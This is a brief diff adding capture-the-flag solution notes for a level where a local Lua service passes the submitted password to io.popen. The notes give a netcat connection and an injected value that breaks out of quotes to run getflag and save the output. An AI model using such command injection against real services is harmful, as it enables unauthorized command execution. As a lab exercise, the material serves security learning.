@@ -1,0 +1,5 @@
+the binary (cat level11.lua) connects to 127.0.0.1:5151 and asks for password
+it gives any password entered to io.popen that executes it so
+nc 127.0.0.1 5151
+\";getflag > /tmp/save;\"
+cat /tmp/save
